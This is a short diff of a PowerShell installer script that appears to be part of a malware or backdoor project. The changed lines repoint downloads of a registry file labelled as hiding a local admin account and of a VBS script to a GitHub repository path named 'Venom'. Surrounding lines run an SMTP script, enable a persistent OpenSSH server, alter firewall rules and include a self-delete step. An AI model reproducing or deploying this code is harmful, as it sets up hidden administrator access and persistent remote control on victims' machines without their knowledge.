@@ -48,10 +48,10 @@ cd $path
 ./smtp.ps1
 
 # registry to hide  local admin
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/refs/heads/main/wrev.reg -OutFile "wrev.reg"
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"
 
 #visual basic scrit to download the registry
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/refs/heads/main/calty.vbs -OutFile "calty.vbs"
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty.vbs -OutFile "calty.vbs"
 
 # enabling  persistent ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -66,6 +66,6 @@ Get-NetFirewallRule -Name *ssh*
 
 
 # self delete
-cd $initial_dir
+# cd $initial_dir
 # del installer.ps1
 
